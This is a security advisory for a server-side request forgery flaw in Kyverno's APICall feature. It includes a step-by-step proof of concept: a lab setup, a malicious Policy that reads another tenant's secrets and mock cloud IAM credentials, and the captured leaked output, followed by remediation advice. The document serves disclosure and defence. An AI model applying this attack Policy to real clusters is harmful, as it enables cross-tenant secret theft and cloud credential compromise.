# [H] Kyverno APICall SSRF Vulnerability Leading to Multi-Tenant Isolation Breach

## Summary
Severity: High
Advisory: GHSA-fmqp-4wfc-w3v7
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-04-14
Source: https://github.com/advisories/GHSA-fmqp-4wfc-w3v7
Type: github-advisory

## Affected
- Go: `github.com/kyverno/kyverno` — affected >=0 <1.16.2

## Details
### Summary

Kyverno's APICall feature contains a Server-Side Request Forgery (SSRF) vulnerability that allows users with Policy creation permissions to access arbitrary internal resources through Kyverno's high-privilege ServiceAccount. In multi-tenant Kubernetes environments, this constitutes a classic Confused Deputy problem: low-privilege tenants can steal sensitive data from other tenants (such as database passwords and API keys) and cloud platform IAM credentials, completely breaking tenant isolation. This vulnerability does not require cluster-admin privileges and can be exploited with only namespace-level Policy creation permissions.

### Details

#### Vulnerability Mechanism

Kyverno's APICall feature allows Policies to fetch external data via HTTP requests. This feature does not validate target URLs when executing HTTP requests, leading to an SSRF vulnerability.

**Source Point - User-Controlled URL**

File: `api/kyverno/v1/common_types.go`, lines 247-250

```go
type ServiceCall struct {
    // URL is the JSON web service URL
    URL string `json:"url"`  // User-controlled, no validation
    Headers []HTTPHeader `json:"headers,omitempty"`
    CABundle string `json:"caBundle,omitempty"`
}
```

The URL field is completely controlled by users through Policy configuration, with no validation mechanism to restrict target addresses.

**Sink Point - HTTP Request Execution**

File: `pkg/engine/apicall/executor.go`, lines 65-110

```go
func (a *executor) executeServiceCall(ctx context.Context, apiCall *kyvernov1.APICall) ([]byte, error) {
    if apiCall.Service == nil {
        return nil, fmt.Errorf("missing service for APICall %s", [a.name](http://a.name/))
    }

    client, err := a.buildHTTPClient(apiCall.Service)
    if err != nil {
        return nil, err
    }

    req, err := a.buildHTTPRequest(ctx, apiCall)
    if err != nil {
        return nil, fmt.Errorf("failed to build HTTP request for APICall %s: %w", [a.name](http://a.name/), err)
    }

    // Line 80: Directly executes HTTP request without URL validation
    resp, err := client.Do(req)
    if err != nil {
        return nil, fmt.Errorf("failed to execute HTTP request for APICall %s: %w", [a.name](http://a.name/), err)
    }
    defer resp.Body.Close()

    // Read and return response content
    body, err := io.ReadAll(resp.Body)
    if err != nil {
        // ...
    }

    return body, nil
}
```

Line 80's `client.Do(req)` directly executes the HTTP request without checking if the target URL is an internal IP address (like 169.254.169.254) or resources belonging to other tenants.

**Confused Deputy Problem**

In multi-tenant environments, Kyverno uses a cluster-wide high-privilege ServiceAccount to execute all APICall requests. When a low-privilege tenant creates a Policy containing malicious APICall directives, Kyverno executes these requests with its own high privileges, leading to privilege escalation.

Attack path:
```
Tenant A (namespace-level permissions)
  → Creates malicious Policy
  → Kyverno (cluster-wide high privileges)
  → Accesses Tenant B's Secrets / Cloud metadata service
  → Sensitive data leaked to PolicyReport
  → Tenant A reads PolicyReport to obtain data
```

### PoC

#### Environment Setup

**Prerequisites**
- Kubernetes cluster 
- Kyverno v1.16.0 installed
- Mock cloud metadata service (optional, for testing cloud credential theft)

**Step 1: Install Kyverno**

```bash
kubectl create namespace kyverno
kubectl create -f https://github.com/kyverno/kyverno/releases/download/v1.16.0/install.yaml
kubectl wait --for=condition=Ready pods --all -n kyverno --timeout=300s
```

Verify installation:
```bash
$ kubectl get pods -n kyverno
NAME                                             READY   STATUS    RESTARTS   AGE
kyverno-admission-controller-5c84845f5-28hz5     1/1     Running   0          2m
kyverno-background-controller-59b7b8d686-7pqxl   1/1     Running   0          2m
kyverno-cleanup-controller-5fd988d64f-nsgdb      1/1     Running   0          2m
kyverno-reports-controller-546cb78fbc-2dd74      1/1     Running   0          2m
```

**Step 2: Deploy Mock Metadata Service**

Create file `metadata-mock.yaml`:

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: metadata-mock
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: metadata-mock
  namespace: metadata-mock
spec:
  replicas: 1
  selector:
    matchLabels:
      app: metadata-mock
  template:
    metadata:
      labels:
        app: metadata-mock
    spec:
      containers:
      - name: mock-server
        image: python:3.9-slim
        command: ["python", "-c"]
        args:
        - |
          import http.server
          import socketserver
          import json

          class Handler(http.server.SimpleHTTPRequestHandler):
              def do_GET(self):
                  if 'iam/security-credentials/test-role' in self.path:
                      self.send_response(200)
                      self.send_header('Content-type', 'application/json')
                      self.end_headers()
                      creds = {
                          "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
                          "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
                          "Token": "SimulatedSessionToken123456",
                          "Expiration": "2025-12-31T23:59:59Z"
                      }
                      self.wfile.write(json.dumps(creds).encode())
                  else:
                      self.send_response(404)
                      self.end_headers()

          with socketserver.TCPServer(("", 80), Handler) as httpd:
              httpd.serve_forever()
        ports:
        - containerPort: 80
---
apiVersion: v1
kind: Service
metadata:
  name: metadata-mock
  namespace: metadata-mock
spec:
  selector:
    app: metadata-mock
  ports:
  - port: 80
    targetPort: 80
```

Deploy:
```bash
kubectl apply -f metadata-mock.yaml
kubectl wait --for=condition=Ready pods --all -n metadata-mock --timeout=120s
```

**Step 3: Create Multi-Tenant Environment**

Create two tenant namespaces:
```bash
kubectl create namespace tenant-a
kubectl create namespace tenant-b
```

Create sensitive data in tenant-b:
```bash
kubectl create secret generic db-credentials -n tenant-b \
  --from-literal=username=admin \
  --from-literal=password=SuperSecret123! \
  --from-literal=database=production-db
```

Create restricted ServiceAccount for tenant-a:
```bash
kubectl create serviceaccount tenant-a-admin -n tenant-a
```

Create file `tenant-a-rbac.yaml`:
```yaml
apiVersion: [rbac.authorization.k8s.io/v1](http://rbac.authorization.k8s.io/v1)
kind: Role
metadata:
  name: policy-creator
  namespace: tenant-a
rules:
- apiGroups: ["[kyverno.io](http://kyverno.io/)"]
  resources: ["policies"]
  verbs: ["create", "get", "list", "update", "patch", "delete"]
- apiGroups: [""]
  resources: ["configmaps"]
  verbs: ["create", "get", "list"]
- apiGroups: ["[wgpolicyk8s.io](http://wgpolicyk8s.io/)"]
  resources: ["policyreports"]
  verbs: ["get", "list"]
---
apiVersion: [rbac.authorization.k8s.io/v1](http://rbac.authorization.k8s.io/v1)
kind: RoleBinding
metadata:
  name: tenant-a-policy-creator
  namespace: tenant-a
roleRef:
  apiGroup: [rbac.authorization.k8s.io](http://rbac.authorization.k8s.io/)
  kind: Role
  name: policy-creator
subjects:
- kind: ServiceAccount
  name: tenant-a-admin
  namespace: tenant-a
```

Apply configuration:
```bash
kubectl apply -f tenant-a-rbac.yaml
```

**Step 4: Verify Permission Isolation**

Create test Pod:
```bash
kubectl run tenant-a-test -n tenant-a \
  --image=bitnami/kubectl:latest \
  --serviceaccount=tenant-a-admin \
  --command -- sleep 3600
```

Verify tenant-a cannot directly access tenant-b:
```bash
$ kubectl exec -n tenant-a tenant-a-test -- kubectl get secrets -n tenant-b
Error from server (Forbidden): secrets is forbidden: User "system:serviceaccount:tenant-a:tenant-a-admin" cannot list resource "secrets" in API group "" in the namespace "tenant-b"
```

This confirms that tenant-a's ServiceAccount indeed cannot directly access tenant-b's resources.

#### Exploitation

**Step 1: Create Malicious Policy**

Create file `confused-deputy-attack.yaml`:

```yaml
apiVersion: [kyverno.io/v1](http://kyverno.io/v1)
kind: Policy
metadata:
  name: confused-deputy-attack
  namespace: tenant-a
spec:
  background: true
  validationFailureAction: Audit
  rules:
  - name: steal-tenant-b-secrets
    match:
      any:
      - resources:
          kinds:
          - ConfigMap
    context:
    - name: tenantBSecrets
      apiCall:
        method: GET
        urlPath: "/api/v1/namespaces/tenant-b/secrets/db-credentials"
    validate:
      message: "STOLEN TENANT-B SECRETS - Username: {{ tenantBSecrets.data.username | base64_decode(@) }}, Password: {{ tenantBSecrets.data.password | base64_decode(@) }}, Database: {{ tenantBSecrets.data.database | base64_decode(@) }}"
      pattern:
        metadata:
          labels:
            force-fail: "true"
  - name: steal-cloud-credentials
    match:
      any:
      - resources:
          kinds:
          - ConfigMap
    context:
    - name: cloudCreds
      apiCall:
        method: GET
        service:
          url: "http://metadata-mock.metadata-mock.svc.cluster.local/latest/meta-data/iam/security-credentials/test-role"
    validate:
      message: "STOLEN CLOUD CREDENTIALS - AccessKeyId: {{ cloudCreds.AccessKeyId }}, SecretAccessKey: {{ cloudCreds.SecretAccessKey }}"
      pattern:
        metadata:
          labels:
            force-fail-cloud: "true"
```

Apply Policy:
```bash
$ kubectl apply -f confused-deputy-attack.yaml
[policy.kyverno.io/confused-deputy-attack](http://policy.kyverno.io/confused-deputy-attack) created
```

**Step 2: Trigger Policy Execution**

Create ConfigMap to trigger Policy:
```bash
$ kubectl create configmap attack-trigger -n tenant-a --from-literal=trigger=now
configmap/attack-trigger created
```

**Step 3: View Stolen Data**

After a few seconds, check PolicyReport:
```bash
$ kubectl get policyreport -n tenant-a -o yaml | grep -A 5 "STOLEN"
```

Actual output:
```yaml
- message: 'validation error: STOLEN TENANT-B SECRETS - Username: admin, Password:
    SuperSecret123!, Database: production-db. rule steal-tenant-b-secrets failed
    at path /metadata/labels/'
  policy: tenant-a/confused-deputy-attack
  result: fail
  rule: steal-tenant-b-secrets
--
- message: 'validation error: STOLEN CLOUD CREDENTIALS - AccessKeyId: AKIAIOSFODNN7EXAMPLE,
    SecretAccessKey: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY. rule steal-cloud-credentials
    failed at path /metadata/labels/'
  policy: tenant-a/confused-deputy-attack
  result: fail
  rule: steal-cloud-credentials
```

Attack successful. Tenant-a has stolen through Kyverno:
1. Tenant-b's database credentials (username: admin, password: SuperSecret123!, database: production-db)
2. Cloud platform IAM credentials (AccessKeyId and SecretAccessKey)

**Step 4: Verify Kyverno Logs**

Check Kyverno admission controller logs:
```bash
$ kubectl logs -n kyverno deployment/kyverno-admission-controller --tail=100 | grep -i "apicall"
2026-01-06T14:40:34Z INFO DefaultContextLoaderFactory apicall/apiCall.go:151 executed service APICall {"name": "cloudCredentials", "len": 180}
```

Logs show APICall executed successfully, returning 180 bytes of data (exactly the JSON length of the mock credentials).

### Impact

This is a critical security vulnerability with particularly severe impact in multi-tenant Kubernetes environments.

**Affected Environments**
- All multi-tenant Kubernetes clusters using Kyverno
- Environments granting users namespace-level Policy creation permissions
- Clusters running on cloud platforms (AWS EKS, GCP GKE, Azure AKS)

**Vulnerability Impact**

1. Complete Multi-Tenant Isolation Breach
   - Tenants can read other tenants' Secrets (database passwords, API keys, etc.)
   - Tenants can access other tenants' ConfigMaps and other resources
   - Completely violates security assumptions of multi-tenant environments

2. Cloud Platform Credential Leakage
   - Can access cloud metadata service (169.254.169.254)
   - Obtain node IAM role credentials
   - Use these credentials to access cloud platform resources (S3, RDS, GCS, etc.)

3. Lateral Movement
   - Extend from Kubernetes cluster permissions to cloud platform resource access
   - Potentially access other tenants' cloud resources
   - Further penetration in cloud environments

4. Confused Deputy Problem
   - Low-privilege users leverage high-privilege proxy (Kyverno) to execute privileged operations
   - Bypass RBAC permission controls
   - Difficult to trace actual attackers through audit logs

**Severity Assessment**

- CVSS 3.1 Score: 8.5 (Critical)
- CWE Classification: CWE-918 (Server-Side Request Forgery)


In multi-tenant environments, the severity of this vulnerability is much higher than in single-tenant environments because it does not require cluster-admin privileges and can be exploited with only namespace-level Policy creation permissions.

**Real-World Scenario Risks**

Scenario 1: SaaS Multi-Tenant Platform
- Each customer has one namespace
- Customer A can steal Customer B's database passwords and API keys
- Leads to data breaches, compliance violations, loss of customer trust

Scenario 2: Enterprise Internal Multi-Team Shared Cluster
- Different business teams share one Kubernetes cluster
- Team A can steal Team B's production database credentials
- Leads to internal data breaches, production incidents

Scenario 3: Cloud Platform Managed Kubernetes
- Running on AWS EKS, GCP GKE, Azure AKS
- Tenants can obtain node IAM role credentials
- Access cloud platform resources, lateral movement to cloud environment

**Remediation Recommendations**

Immediate measures:
1. Disable APICall feature in multi-tenant environments
2. Restrict Policy creation permissions to cluster-admin only
3. Use NetworkPolicy to restrict Kyverno Pod egress traffic

Long-term fixes:
1. Add URL validation in executeServiceCall function to block internal IP addresses
2. Use separate low-privilege ServiceAccount for APICall
3. Implement URL whitelist mechanism
4. Audit and monitor all APICall requests

## References
- https://github.com/kyverno/kyverno/security/advisories/GHSA-fmqp-4wfc-w3v7
- https://github.com/kyverno/kyverno
